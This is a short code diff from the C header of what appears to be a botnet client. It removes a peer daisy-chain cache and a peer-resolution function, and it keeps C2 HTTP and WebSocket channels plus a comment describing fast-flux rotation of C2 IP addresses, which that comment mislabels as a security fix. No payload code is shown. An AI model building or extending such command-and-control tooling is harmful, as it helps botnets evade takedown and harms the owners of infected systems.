@@ -104,11 +104,6 @@ typedef struct {
     notnet_http_t c2_http;
     notnet_ws_t c2_ws;
     
-    /* Peer daisychain */
-    char peer_cache[PEER_CACHE_SIZE][256];
-    int peer_count;
-    time_t peer_cache_time;  /* last successful peer DNS resolution time */
-    
     /* SECURITY FIX (#85): Fast-flux C2. When enabled, all three C2
      * channels resolve every A record of their hostname into a rotating
      * cache (see src/protocol.c), rotate the active IP every flux_ttl
@@ -250,7 +245,6 @@ void ws_disconnect(notnet_bot_t *bot);
 int protocol_connect_all(notnet_bot_t *bot);
 int protocol_process_commands(notnet_bot_t *bot);
 int protocol_send_heartbeat(notnet_bot_t *bot);
-int protocol_resolve_peers(notnet_bot_t *bot);
 int protocol_resolve_host(const char *host);
 char *protocol_hex_encode(const char *data, int len);
 int protocol_send_response(notnet_bot_t *bot, const char *command, const char *result);
